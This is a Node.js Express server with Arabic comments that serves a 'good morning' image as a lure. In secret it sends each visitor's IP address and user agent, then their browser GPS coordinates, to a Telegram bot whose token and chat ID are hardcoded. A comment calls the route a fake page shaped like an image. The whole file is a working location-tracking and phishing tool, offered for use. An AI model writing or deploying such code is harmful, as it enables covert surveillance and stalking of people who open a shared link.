import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

// بيانات البوت
const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
const CHAT_ID = "7485197107";

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// صفحة مزيفة بشكل صورة
app.get("/good_morning", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"];

  await sendToTelegram(`📸 زيارة جديدة:\nIP: ${ip}\nUA: ${ua}`);

  res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title></title>
      <style>
        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000; }
        img { max-width:100%; height:auto; display:block; }
      </style>
    </head>
    <body>
      <img src="/good_morning.jpg" alt="صباح الخير">
      <script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
          });
        }
      </script>
    </body>
    </html>
  `);
});

// استقبال GPS
app.get("/log", async (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    await sendToTelegram(`📍 GPS:\nLatitude: ${lat}\nLongitude: ${lon}`);
  }
  res.send("");
});

// إرسال الصورة الأصلية
app.get("/good_morning.jpg", (req, res) => {
  res.sendFile(process.cwd() + "/good_morning.jpg");
});

app.listen(PORT, () => console.log(`✅ Running on port ${PORT}`));
